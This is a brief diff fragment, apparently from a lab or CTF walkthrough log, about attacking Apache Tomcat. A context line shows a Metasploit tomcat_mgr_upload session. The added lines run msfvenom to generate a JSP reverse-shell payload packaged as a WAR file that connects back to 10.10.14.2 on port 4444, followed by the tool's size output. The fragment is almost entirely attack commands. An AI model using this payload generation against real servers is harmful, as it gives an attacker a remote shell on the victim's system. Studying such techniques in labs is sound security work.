@@ -241,4 +241,7 @@ msf5 exploit(multi/http/tomcat_mgr_upload) > exit
 .
 .
 .
+allenwest1@debian:~$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f war > m10x.war
+Payload size: 1096 bytes
+Final size of war file: 1096 bytes
 
